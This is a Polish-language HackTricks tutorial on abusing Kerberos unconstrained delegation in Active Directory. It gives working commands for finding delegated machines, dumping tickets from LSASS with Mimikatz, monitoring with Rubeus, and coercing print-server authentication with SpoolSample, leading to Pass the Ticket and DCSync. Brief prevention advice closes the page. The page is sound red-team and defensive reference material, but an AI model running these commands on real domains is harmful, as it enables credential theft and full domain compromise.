# Delegacja bez ograniczeń

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Delegacja bez ograniczeń

Jest to funkcja, którą administrator domeny może ustawić dla dowolnego **komputera** w domenie. Wtedy, za każdym razem, gdy **użytkownik loguje się** na komputerze, **kopia TGT** tego użytkownika zostanie **wysłana do TGS** dostarczonego przez DC **i zapisana w pamięci w LSASS**. Jeśli masz uprawnienia administratora na maszynie, będziesz mógł **wydobyć bilety i podszywać się pod użytkowników** na dowolnej maszynie.

Jeśli administrator domeny zaloguje się na komputerze z aktywowaną funkcją "Delegacja bez ograniczeń", a ty masz uprawnienia lokalnego administratora na tej maszynie, będziesz mógł wydobyć bilet i podszywać się pod administratora domeny gdziekolwiek (przywileje domeny).

Możesz **znaleźć obiekty komputerowe z tą właściwością**, sprawdzając, czy atrybut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) zawiera [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Możesz to zrobić za pomocą filtru LDAP „(userAccountControl:1.2.840.113556.1.4.803:=524288)”, co robi powerview:

<pre class="language-bash"><code class="lang-bash"># Wyświetl komputery bez ograniczeń
## Powerview
Get-NetComputer -Unconstrained #DCs zawsze się pojawiają, ale nie są przydatne do eskalacji uprawnień
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Eksportuj bilety za pomocą Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Sposób zalecany
kerberos::list /export #Inny sposób

# Monitoruj logowania i eksportuj nowe bilety
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Sprawdzaj co 10 sekund nowe TGT</code></pre>

Załaduj bilet Administratora (lub ofiary) do pamięci za pomocą **Mimikatz** lub **Rubeus dla** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Więcej informacji: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Więcej informacji o delegacji bez ograniczeń na stronie ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Wymuś uwierzytelnianie**

Jeśli atakujący jest w stanie **zakraść się na komputerze zezwalającym na "Delegację bez ograniczeń"**, może **oszukać** serwer **drukowania**, aby **automatycznie się zalogować** i **zapisać TGT** w pamięci serwera.\
Następnie atakujący mógłby przeprowadzić atak **Pass the Ticket, aby podszywać się** pod konto użytkownika serwera drukowania.

Aby zmusić serwer drukowania do zalogowania się na dowolnej maszynie, można użyć [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Jeśli TGT pochodzi od kontrolera domeny, można przeprowadzić atak [**DCSync**](acl-persistence-abuse/#dcsync) i uzyskać wszystkie hashe z kontrolera domeny.\
[**Więcej informacji na temat tego ataku na stronie ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Oto inne sposoby próby wymuszenia uwierzytelnienia:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Zapobieganie

* Ogranicz logowanie DA/Admin do konkretnych usług
* Ustaw "Konto jest wrażliwe i nie można go delegować" dla kont uprzywilejowanych.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
